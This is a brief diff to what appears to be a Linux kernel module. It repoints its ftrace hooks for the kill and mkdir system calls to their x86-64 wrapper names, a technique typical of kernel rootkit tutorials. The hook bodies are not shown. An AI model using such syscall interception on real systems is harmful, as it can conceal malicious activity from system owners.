@@ -78,8 +78,8 @@ static asmlinkage long custom_close(unsigned int fd)
 
 
 static struct ftrace_hook hooks[] = {
-    HOOK("sys_kill", hook_kill, &original_kill),
-    HOOK("sys_mkdir", custom_mkdir, &original_mkdir),
+    HOOK("__x64_sys_kill", hook_kill, &original_kill),
+    HOOK("__x64_sys_mkdir", custom_mkdir, &original_mkdir),
     // HOOK("sys_close", custom_close, &original_close),
 };
 
